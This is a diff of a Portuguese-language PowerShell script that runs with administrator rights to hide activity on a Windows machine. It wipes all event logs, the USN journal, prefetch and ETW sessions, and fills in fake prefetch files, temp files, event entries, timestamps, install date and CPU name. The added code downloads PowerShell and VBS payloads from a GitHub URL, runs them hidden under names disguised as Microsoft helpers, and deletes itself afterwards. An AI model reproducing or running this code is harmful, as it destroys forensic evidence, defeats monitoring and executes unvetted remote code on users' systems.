@@ -1,6 +1,6 @@
 #requires -RunAsAdministrator
 # Improved console output settings
-$Host.UI.RawUI.WindowTitle = "By Maad - W h y - ? ? ?"
+$Host.UI.RawUI.WindowTitle = "W h y"
 $Host.UI.RawUI.BackgroundColor = "Black"
 $Host.UI.RawUI.ForegroundColor = "White"
 Clear-Host
@@ -17,18 +17,18 @@ function Remove-FilesFrom {
         try {
             Get-ChildItem -Path $Path -Recurse -Force -ErrorAction SilentlyContinue | 
                 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
-            Write-Host "[+] Limpou: $Path" -ForegroundColor Green
+            Write-Host "[•] - Limpou: $Path" -ForegroundColor Green
         } catch {
-            Write-Host "[!] Erro ao limpar: $Path" -ForegroundColor Red
+            Write-Host "[!] - Erro ao limpar: $Path" -ForegroundColor Red
         }
     } else {
-        Write-Host "[!] Caminho não encontrado: $Path" -ForegroundColor Yellow
+        Write-Host "[!] - Caminho não encontrado: $Path" -ForegroundColor Yellow
     }
 }
-
 Remove-FilesFrom -Path $env:TEMP
 Remove-FilesFrom -Path "C:\Windows\Temp"
 Remove-FilesFrom -Path "C:\Windows\Prefetch"
+Remove-FilesFrom -Path "C:\ProgramData\Microsoft\Network\Downloader"
 Clear-Host
 
 $regKeys = @(
@@ -86,7 +86,6 @@ $regKeys = @(
     "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System"
 )
 
-# Expanded program list with more variations
 $programs = @(
     "CHROME", "MULTITHEFTAUTO", "FIREFOX", "EDGE", "BRAVE", "OPERA", "DISCORD", "SPOTIFY", "STEAM", "EPICGAMES", "BATTLE.NET",
     "ADOBEPHOTOSHOP", "ADOBEILLUSTRATOR", "ADOBEAFTEREFFECTS", "ADOBEPREMIERE", "PAINTNET", "PAINT",
@@ -105,9 +104,7 @@ $programs = @(
 )
 
 $baseDir = "C:\Program Files\ProgramSystem"
-
 $createdDirs = @()
-
 Write-Host "Verificando/Criando diretórios..." -ForegroundColor Cyan
 foreach ($program in $programs) {
     $dirPath = Join-Path -Path $baseDir -ChildPath $program
@@ -116,14 +113,14 @@ foreach ($program in $programs) {
         try {
             $null = New-Item -Path $dirPath -ItemType Directory -Force
             $createdDirs += $dirPath
-            Write-Host "  Criado: $dirPath" -ForegroundColor Green
+            Write-Host "[•] - Criado: $dirPath" -ForegroundColor Green
         }
         catch {
-            Write-Host "  [ERRO] Falha ao criar $dirPath : $_" -ForegroundColor Red
+            Write-Host "[!] - Falha ao criar $dirPath : $_" -ForegroundColor Red
         }
     }
     else {
-        Write-Host "  [INFO] Diretório já existe: $dirPath" -ForegroundColor Blue
+        Write-Host "[-] Diretório já existe: $dirPath" -ForegroundColor Blue
     }
 }
 
@@ -144,10 +141,10 @@ SessionID: $([System.Diagnostics.Process]::GetCurrentProcess().SessionId)
         $null = New-Item -Path $fakeExe -ItemType File -Force
         (Get-Item $fakeExe).LastWriteTime = (Get-Date).AddHours(-1)
         
-        Write-Host "  Simulado: $([System.IO.Path]::GetFileName($dir))" -ForegroundColor DarkGray
+        Write-Host "[•] - Simulado: $([System.IO.Path]::GetFileName($dir))" -ForegroundColor Green
     }
     catch {
-        Write-Host "  [ERRO] Falha ao simular execução em $dir : $_" -ForegroundColor Red
+        Write-Host "[!] - Falha ao simular execução em $dir : $_" -ForegroundColor Red
     }
 }
 
@@ -156,19 +153,19 @@ foreach ($dir in $createdDirs) {
     try {
         if (Test-Path -Path $dir) {
             Remove-Item -Path $dir -Recurse -Force
-            Write-Host "  Limpo: $dir" -ForegroundColor Green
+            Write-Host "[•] - Limpo: $dir" -ForegroundColor Green
         }
     }
     catch {
-        Write-Host "  [ERRO] Falha ao limpar $dir : $_" -ForegroundColor Red
+        Write-Host "[!] - Falha ao limpar $dir : $_" -ForegroundColor Red
         
         try {
             Start-Sleep -Seconds 1
             Remove-Item -Path $dir -Recurse -Force -ErrorAction Stop
-            Write-Host "  Limpeza alternativa bem-sucedida: $dir" -ForegroundColor DarkGreen
+            Write-Host "[•] - Limpeza alternativa bem-sucedida: $dir" -ForegroundColor Green
         }
         catch {
-            Write-Host "  [ERRO GRAVE] Não foi possível limpar $dir - Limpe manualmente" -ForegroundColor Red
+            Write-Host "[!] - Não foi possível limpar $dir - Limpe manualmente" -ForegroundColor Red
         }
     }
 }
@@ -178,16 +175,15 @@ Write-Host "`nLimpando logs do sistema..." -ForegroundColor Cyan
 try {
     wevtutil cl "Application" | Out-Null
     wevtutil cl "System" | Out-Null
-    Write-Host "  Logs do sistema limpos" -ForegroundColor Green
+    Write-Host "[•] - Logs do sistema limpos" -ForegroundColor Green
 }
 catch {
-    Write-Host "  [AVISO] Não foi possível limpar todos os logs: $_" -ForegroundColor Yellow
+    Write-Host "[!] - Não foi possível limpar todos os logs: $_" -ForegroundColor Yellow
 }
-Write-Host "`nProcesso concluído!" -ForegroundColor Green
-Write-Host "Diretórios criados e removidos: $($createdDirs.Count)" -ForegroundColor White
 Clear-Host
+Write-Host "[•] - Processo concluído!" -ForegroundColor Green
+Write-Host "[•] - Diretórios criados e removidos: $($createdDirs.Count)" -ForegroundColor White
 
-# Improved timestamp modification function
 function Set-FileTime {
     param (
         [string]$FilePath,
@@ -206,16 +202,15 @@ function Set-FileTime {
         }
     }
 }
-# Main execution
+Write-Host "`n[FASE 1] Manipulação do registro..." -ForegroundColor Green
 Clear-Host
-Write-Host "`n[PHASE 1] Registry manipulation..." -ForegroundColor Green
 
 # 2. Clean USN Journal
 try {
     fsutil usn deletejournal /D C: | Out-Null
-    Write-Host "  USN Journal cleaned" -ForegroundColor Green
+    Write-Host "[•] - USN Journal Limpo" -ForegroundColor Green
 } catch {
-    Write-Host "[!] Error cleaning USN Journal: $_" -ForegroundColor Red
+    Write-Host "[!] - Error Limpeza USN Journal: $_" -ForegroundColor Red
 }
 Clear-Host
 
@@ -224,10 +219,10 @@ $logs = wevtutil el
 foreach ($log in $logs) {
     try { 
         wevtutil cl "$log" | Out-Null
-        Write-Host "  Cleared log: $log" -ForegroundColor DarkGray
+        Write-Host "[•] - Limpando log: $log" -ForegroundColor Green
     } 
     catch {
-        Write-Host "[!] Error clearing log $log : $_" -ForegroundColor Red
+        Write-Host "[!] Error Limpeza log $log : $_" -ForegroundColor Red
     }
 }
 
@@ -238,9 +233,8 @@ $prefetchPath = "$env:SystemRoot\Prefetch"
 if (Test-Path $prefetchPath) {
     try {
         Remove-Item "$prefetchPath\*" -Force -Recurse -ErrorAction SilentlyContinue
-        Write-Host "  Prefetch cleaned" -ForegroundColor Green
+        Write-Host "[•] - Prefetch Limpo!" -ForegroundColor Green
         
-        # Create fake prefetch files
         $prefetchCount = Get-Random -Minimum 50 -Maximum 150
         foreach ($prog in $programs | Get-Random -Count $prefetchCount) {
             $file = "$prefetchPath\$prog-$(Get-Random -Minimum 10000000 -Maximum 99999999).pf"
@@ -252,10 +246,10 @@ if (Test-Path $prefetchPath) {
             $fileTime = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 90))
             Set-FileTime -FilePath $file -NewTime $fileTime
         }
-        Write-Host "  Created $prefetchCount fake prefetch files" -ForegroundColor Green
+        Write-Host "[•] - Criando $prefetchCount Falsos Log" -ForegroundColor Green
     } 
     catch {
-        Write-Host "[!] Error manipulating Prefetch: $_" -ForegroundColor Red
+        Write-Host "[!] - Error Prefetch: $_" -ForegroundColor Red
     }
 }
 
@@ -293,17 +287,16 @@ foreach ($temp in $tempPaths) {
         $fileTime = (Get-Date).AddHours(-(Get-Random -Minimum 1 -Maximum 720))
         Set-FileTime -FilePath $filePath -NewTime $fileTime
         
-        Write-Host "Created fake temp file: $filePath" -ForegroundColor Green
+        Write-Host "[•] - Criando Falso Temp Files: $filePath" -ForegroundColor Green
     }
 }
 
-Write-Host "`nFake temp files generation completed!" -ForegroundColor Cyan
-
+Write-Host "`n[•] - Geração de arquivos temporários falsos concluída!" -ForegroundColor Cyan
 Clear-Host
-Write-Host "`n[PHASE 3] Creating fake artifacts..." -ForegroundColor Green
+Write-Host "`n[FASE 3] Criando artefatos falsos..." -ForegroundColor Green
 
 
-# 5. Create fake temp files in multiple locations
+# 5. Create fake temp files 
 $tempPaths = @($env:TEMP, "$env:SystemRoot\Temp", "$env:LOCALAPPDATA\Temp", "$env:USERPROFILE\AppData\Local\Temp")
 foreach ($temp in $tempPaths) {
     if (Test-Path $temp) {
@@ -323,10 +316,10 @@ foreach ($temp in $tempPaths) {
                 $fileTime = (Get-Date).AddHours(-(Get-Random -Minimum 1 -Maximum 720))
                 Set-FileTime -FilePath $filePath -NewTime $fileTime
             }
-            Write-Host "  Created $tempFileCount fake temp files in $temp" -ForegroundColor Green
+            Write-Host "[•] - Criando $tempFileCount Falso temp file no $temp" -ForegroundColor Green
         }
         catch {
-            Write-Host "[!] Error creating temp files in $temp : $_" -ForegroundColor Red
+            Write-Host "[!] - Error de criacao no temp $temp : $_" -ForegroundColor Red
         }
     }
 }
@@ -356,20 +349,18 @@ foreach ($path in $executionArtifacts) {
                 $data = New-Object byte[] $size
                 (New-Object Random).NextBytes($data)
                 [IO.File]::WriteAllBytes($filePath, $data)
-                
-                # Set realistic timestamps
                 $fileTime = (Get-Date).AddDays(-(Get-Random -Minimum 1 -Maximum 60))
                 Set-FileTime -FilePath $filePath -NewTime $fileTime
             }
-            Write-Host "  Created execution artifacts in $path" -ForegroundColor DarkGray
+            Write-Host "[•] - Criação de Artefatos em $path" -ForegroundColor DarkGray
         }
         catch {
-            Write-Host "[!] Error creating execution artifacts in $path : $_" -ForegroundColor Red
+            Write-Host "[!] - Error de criação de artefatos em $path : $_" -ForegroundColor Red
         }
     }
 }
 Clear-Host
-Write-Host "`n[PHASE 4] Generating fake events..." -ForegroundColor Green
+Write-Host "`n[FASE 4] Gerando eventos falsos..." -ForegroundColor Green
 
 #7 Fake Event
 function nonEvent {
@@ -386,10 +377,10 @@ function nonEvent {
     try {
         New-EventLog -LogName $LogType -Source $source -ErrorAction SilentlyContinue
         Write-EventLog -LogName $LogType -Source $source -EntryType Information -EventId $eventId -Message $msg
-        Write-Host "Created event in $LogType log from $source" -ForegroundColor Green
+        Write-Host "[•] - Criando Eventos de log $LogType log from $source" -ForegroundColor Green
     }
     catch {
-        Write-Host "[!] Error creating event: $_" -ForegroundColor Red
+        Write-Host "[!] - Erro na criação de eventos: $_" -ForegroundColor Red
     }
 }
 
@@ -441,9 +432,7 @@ foreach ($i in 1..150) {
     nonEvent -Program $program -Message $message -LogType $logType
 }
 
-Write-Host "`nFake event log generation completed!" -ForegroundColor Cyan
-
-# Função melhorada para modificar timestamps com tentativa de tomar posse do arquivo
+Write-Host "`nGeração de log de eventos falsos concluída!" -ForegroundColor Cyan
 function Set-FileTime {
     param (
         [string]$FilePath,
@@ -452,7 +441,6 @@ function Set-FileTime {
     
     if (Test-Path $FilePath) {
         try {
-            # Tenta tomar posse do arquivo primeiro
             takeown /f $FilePath /a | Out-Null
             icacls $FilePath /grant Administrators:F /t /c /q | Out-Null
             
@@ -463,7 +451,7 @@ function Set-FileTime {
             return $true
         }
         catch {
-            Write-Host "[AVISO] Não foi possível modificar timestamps para $FilePath : $_" -ForegroundColor Yellow
+            Write-Host "[!] Não foi possível modificar timestamps para $FilePath : $_" -ForegroundColor Red
             return $false
         }
     }
@@ -472,21 +460,17 @@ function Set-FileTime {
 
 # 8. Reiniciar o Explorer de forma segura
 try {
-	Clear-Host
-    Write-Host "  Reiniciando processo Explorer..." -ForegroundColor Yellow
-    
-    # Fecha o Explorer de forma mais limpa
+    Clear-Host
+    Write-Host "[•] - Reiniciando processo Explorer..." -ForegroundColor Green
     $explorerProcesses = Get-Process -Name explorer -ErrorAction SilentlyContinue
     if ($explorerProcesses) {
         $explorerProcesses | Stop-Process -Force
         Start-Sleep -Seconds 3
     }
-    
-    # Reinicia o Explorer
     Start-Process "explorer.exe"
-    Write-Host "  Explorer reiniciado com sucesso" -ForegroundColor Green
+    Write-Host "[•] - Explorer reiniciado com sucesso!" -ForegroundColor Green
 } catch {
-    Write-Host "[ERRO] Falha ao reiniciar o Explorer: $_" -ForegroundColor Red
+    Write-Host "[!] - Falha ao reiniciar o Explorer: $_" -ForegroundColor Red
 }
 function Set-FileTime {
     param (
@@ -519,12 +503,12 @@ foreach ($file in $systemFiles) {
         $success = Set-FileTime -FilePath $file -NewTime $fileTime
         
         if ($success) {
-            Write-Host "  [SUCESSO] Timestamps modificados para $file" -ForegroundColor Green
+            Write-Host "[•] - Timestamps modificados para $file" -ForegroundColor Green
         } else {
-            Write-Host "  [FALHA] Não foi possível modificar $file" -ForegroundColor Red
+            Write-Host "[!] -  Não foi possível modificar $file" -ForegroundColor Red
         }
     } else {
-        Write-Host "  [AVISO] Arquivo não encontrado: $file" -ForegroundColor Yellow
+        Write-Host "[!] - Arquivo não encontrado: $file" -ForegroundColor Red
     }
 }
 
@@ -534,9 +518,9 @@ try {
     Write-Host "`nLimpando sessões ETW..." -ForegroundColor Cyan
     logman stop -ets | Out-Null
     logman delete -ets | Out-Null
-    Write-Host "  Sessões ETW paradas e removidas com sucesso" -ForegroundColor Green
+    Write-Host "[•] - Sessões ETW paradas e removidas com sucesso" -ForegroundColor Green
 } catch {
-    Write-Host "[ERRO] Falha ao limpar sessões ETW: $_" -ForegroundColor Red
+    Write-Host "[!] - Falha ao limpar sessões ETW: $_" -ForegroundColor Red
 }
 
 # Change Date Install ( Formating Sys )
@@ -545,12 +529,12 @@ $newInstallDate = 1742761079
 if (Test-Path $regPath) {
     try {
         Set-ItemProperty -Path $regPath -Name "InstallDate" -Value $newInstallDate -Type DWord
-        Write-Host "InstallDate alterado com sucesso para $newInstallDate (23/03/2025 21:17:59)"
+        Write-Host "[•] -  InstallDate alterado com sucesso para $newInstallDate (23/03/2025 21:17:59)" -ForegroundColor Green
     } catch {
-        Write-Error "Erro ao alterar InstallDate: $_"
+        Write-Error "[!] - Erro ao alterar InstallDate: $_" -ForegroundColor Red
     }
 } else {
-    Write-Error "Chave de Registro não encontrada: $regPath"
+    Write-Error "[!] - Chave de Registro não encontrada: $regPath" -ForegroundColor Red
 }
 Clear-Host
 
@@ -570,23 +554,6 @@ $cpuKey = "HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0"
 Set-ItemProperty -Path $cpuKey -Name "ProcessorNameString" -Value $fakename
 Write-Output "Processador falsificado com sucesso: $fakename"
 
-# Exec Person
-Clear-Host
-$destDir = "C:\Program Files\Windows NT\Personalization"
-$names = @("system64.ps1", "microsoft.ps1", "sys64x.ps1", "intel.ps1", "amdDriver.ps1")
-$randomName = Get-Random -InputObject $names
-$scriptPath = Join-Path -Path $destDir -ChildPath $randomName
-
-$downloadUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/why2.ps1"  # << TROQUE AQUI
-if (-Not (Test-Path $destDir)) {
-    New-Item -Path $destDir -ItemType Directory -Force | Out-Null
-}
-Invoke-WebRequest -Uri $downloadUrl -OutFile $scriptPath
-Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Wait
-$MyPath = $MyInvocation.MyCommand.Path
-Start-Sleep -Seconds 1
-Start-Process powershell -ArgumentList "-Command `"Start-Sleep -Seconds 2; Remove-Item -Path `"$MyPath`" -Force`"" -WindowStyle Hidden
-
 # Final completion message
 Clear-Host
 Write-Host "`n==================================" -ForegroundColor White
@@ -595,26 +562,93 @@ Write-Host "`Limpeza de Eventos Ok!" -ForegroundColor Green
 Write-Host "`Limpeza de Journal Ok!" -ForegroundColor Green
 Write-Host "`Fake de Registro Ok!" -ForegroundColor Green
 Write-Host "`Fake de Event Ok!" -ForegroundColor Green
-Write-Host "`Fake de Log|Prefetch|Temp Ok!" -ForegroundColor Green
+Write-Host "`Fake de Log | Prefetch | Temp Ok!" -ForegroundColor Green
 Write-Host "`Fake Execuçao de Programas Ok!" -ForegroundColor Green
 Write-Host "`n==================================" -ForegroundColor White
 Write-Host "`Finalizado com sucesso!" -ForegroundColor White
 Write-Host "`n==================================" -ForegroundColor White
 
-# Exit Bypass Start
-$names = @("system64.vbs", "microsoft.vbs", "sys64x.vbs", "intel.vbs", "amdDriver.vbs")
-$chosenName = Get-Random -InputObject $names
-$dir = "C:\Program Files\Windows NT"
-$vbsPath = Join-Path $dir $chosenName
-if (-not (Test-Path $dir)) {
-    New-Item -Path $dir -ItemType Directory -Force | Out-Null
+# Exit Bypass Start - Versão Melhorada
+function Invoke-StealthExecution {
+    param (
+        [string]$targetDir = "C:\Windows\Temp\MSInstall",
+        [string]$vbsUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/microsoft.vbs"
+    )
+    try {
+        if (-not (Test-Path $targetDir)) {
+            $null = New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction Stop
+        }
+        $vbsName = "MSI_Helper_$(Get-Date -Format 'yyyyMMdd').vbs"
+        $vbsPath = Join-Path $targetDir $vbsName
+        try {
+            $progressPreference = 'silentlyContinue'
+            Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -UseBasicParsing -ErrorAction Stop
+        }
+        catch {
+            Write-Verbose "Falha no download: $_" -Verbose
+            return $false
+        }
+        if (-not (Test-Path $vbsPath -PathType Leaf)) {
+            Write-Verbose "Arquivo VBS não foi criado corretamente" -Verbose
+            return $false
+        }
+        $psi = New-Object System.Diagnostics.ProcessStartInfo
+        $psi.FileName = "wscript.exe"
+        $psi.Arguments = "`"$vbsPath`""
+        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $psi.CreateNoWindow = $true
+        $null = [System.Diagnostics.Process]::Start($psi)
+
+        # Agendamento da auto-exclusão
+        $selfDeleteCode = @"
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+WScript.Sleep 8000
+fso.DeleteFile "$vbsPath", True
+Set fso = Nothing
+"@
+        $deleteScriptPath = Join-Path $targetDir "CleanUp_$(Get-Random).vbs"
+        $selfDeleteCode | Out-File $deleteScriptPath -Encoding ASCII
+        Start-Process "wscript.exe" -ArgumentList "`"$deleteScriptPath`"" -WindowStyle Hidden
+
+        return $true
+    }
+    catch {
+        Write-Verbose "Erro durante execução stealth: $_" -Verbose
+        return $false
+    }
 }
-if (Test-Path $vbsPath) {
-    Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
+if (Invoke-StealthExecution) {
+    Write-Verbose "Execução bypass concluída com sucesso" -Verbose
+} else {
+    Write-Verbose "Falha na execução bypass" -Verbose
 }
-$url = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/microsoft.vbs"
-Invoke-WebRequest -Uri $url -OutFile $vbsPath -UseBasicParsing
-Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
-Start-Sleep -Seconds 5
-Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
+
+# Versão otimizada para fechamento imediato após execução
+Clear-Host
+$destDir = "C:\Windows\Temp\WindowsUpdate"
+$scriptName = "WUHelper_$(Get-Date -Format 'yyyyMMdd').ps1"
+$scriptPath = Join-Path -Path $destDir -ChildPath $scriptName
+$downloadUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/why2.ps1"
+try {
+    if (-not (Test-Path $destDir)) {
+        New-Item -Path $destDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
+    }
+
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $scriptPath -ErrorAction Stop
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "powershell.exe"
+    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    $selfPath = $MyInvocation.MyCommand.Path
+    Start-Process powershell.exe -ArgumentList @"
+-NoProfile -Command "Start-Sleep -Seconds 2; try { Remove-Item -Path '$selfPath' -Force } catch { exit 1 }"
+"@ -WindowStyle Hidden
+    exit 0
+}
+catch {
+    Write-Host "Erro na execução: $_" -ForegroundColor Red
+    exit 1
+}
 Pause-Script
